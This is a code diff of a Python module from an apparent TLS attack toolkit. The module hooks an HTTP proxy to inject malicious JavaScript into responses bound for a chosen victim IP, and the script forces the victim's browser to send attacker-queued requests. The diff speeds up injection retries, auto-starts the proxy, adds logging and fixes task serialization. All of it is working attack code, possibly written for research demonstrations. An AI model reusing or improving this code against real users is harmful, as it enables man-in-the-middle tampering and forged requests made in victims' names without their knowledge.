@@ -10,7 +10,7 @@ from tls_attack.proxy.HTTPProxyServer import *
 
 # Delay between each attempt in seconds to injection 
 # malicious JavaScript in a HTTP response
-SCRIPT_INJECTION_DELAY = 10
+SCRIPT_INJECTION_DELAY = 1
 
 # Static content of the module used for the injection
 # and the communication
@@ -34,11 +34,14 @@ class ForceRequest:
         if not self.is_started:
             self.proxy.on_url_request(self._on_url_request)
             self.proxy.on_url_response(self._on_url_response)
+            self.proxy.start()
             self.is_started = True
 
     # Forces the target (source_ip) to execute the request with the given url 
     # and post_data. The callback will be invoked after the request was forced.
     def force_request(self, source_ip, url, post_data = None, callback = None):
+        logging.info("Received forced request for IP : %s URL : %s" % (source_ip, url))
+
         if not source_ip in self.queue:
             queue_id = str(uuid.uuid4()).replace("-", "")
             self.queue[source_ip] = { "task" : [], "id" : bytes(queue_id, "ascii") }
@@ -64,6 +67,8 @@ class ForceRequest:
             result = response.append_body(content)
 
         if not result is None:
+            logging.info("Injected the response of Content-Type : %s." % response.headers[b"Content-Type"])
+
             # We mark all the request as attempted to prevent 2 scripts from doing
             # the exact same job. If it fails, it will be attempted again after
             # the SCRIPT_INJECTION_DELAY delay.
@@ -82,7 +87,18 @@ class ForceRequest:
             if len(queue["task"]) == 0:
                 return EMPTY_RESPONSE
 
-            task = json.dumps(queue["task"][0].__dict__)
+            # Create a copy of the structure without the unserializable elements
+            # We also make sure the string are not byte array
+            task_struct = queue["task"][0].__dict__.copy()
+            task_struct.pop("callback")
+
+            if type(task_struct["url"]) == bytes:
+                task_struct["url"] = str(task_struct["url"], "ascii")
+            
+            if type(task_struct["post_data"]) == bytes:
+                task_struct["post_data"] = str(task_struct["post_data"], "ascii")
+
+            task = json.dumps(task_struct)
             return HTTPResponse.create_response_from_content(bytes(task, "ascii"), b"application/json")
 
         # Message to tell the server that the last request was 
@@ -127,6 +143,8 @@ class ForceRequest:
     # The script injection is done in the response part.
     # We use this to sneak in the content we want.
     def _on_url_response(self, connection, request, response):
+        logging.info("Received request from IP : %s" % connection.source_ip)
+
         if connection.source_ip in self.queue:
             force_queue = self.queue[connection.source_ip]
 
